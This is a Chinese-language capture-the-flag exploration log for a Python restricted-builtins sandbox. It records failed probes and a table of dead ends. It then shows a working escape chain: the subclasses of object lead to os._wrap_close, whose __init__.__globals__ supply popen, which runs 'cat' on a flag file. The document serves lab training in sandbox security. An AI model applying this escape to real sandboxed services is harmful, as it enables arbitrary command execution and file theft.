# e2-01 · 探索记录

对应题解：[`e2-01.md`](./e2-01.md)

## 目标与起点

`GET /` 把契约写在 JSON 里：POST `code`，受限 builtins。先确认服务活着，再看字典里到底剩什么。

## 第一阶段：内建字典是空的，类继承不是

`print(1)` 返回 `{"output":"1\n"}`，说明执行通路是通的。`print(type(__builtins__))` 得到 `NameError: name 'type' is not defined`，`type` 不在允许名单里。把 `__builtins__` 当字典打印，名单是 `abs`、`bool`、`dict`、`list`、`print`、`str` 这一类，没有 `open`，也没有 `type`。

`import os` 不是语法错误，而是 `ImportError: __import__ not found`。导入被拿掉了，但属性访问还在。

`().__class__.__bases__[0].__subclasses__()` 能跑，返回 492 个类。在类名里找 `wrap`、`os.`、`Popen`，命中 `<class 'os._wrap_close'>`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 连续几次 `print(1)` 得到 502 | 当时上游没接上 | 随后同样的请求返回 200 和 `{"output":"1\n"}`，502 不是沙箱策略 |
| `import os` | 导入被拿掉 | `ImportError: __import__ not found`，不是模块不存在 |
| `type(__builtins__)` | 名字不存在 | `NameError: name 'type' is not defined` |
| 直接 `open` / `system` | 不在名单里 | builtins 字典打印结果没有这两项 |

## 这次真正的收获

沙箱换的是 `__builtins__` 这个字典，对象模型还在。`os._wrap_close.__init__.__globals__` 里同时有 `popen`、`system`、`open`、`listdir`、`execv`。用 `popen("cat /challenge/flag1.txt").read()` 就能把文件内容放进 `output`。
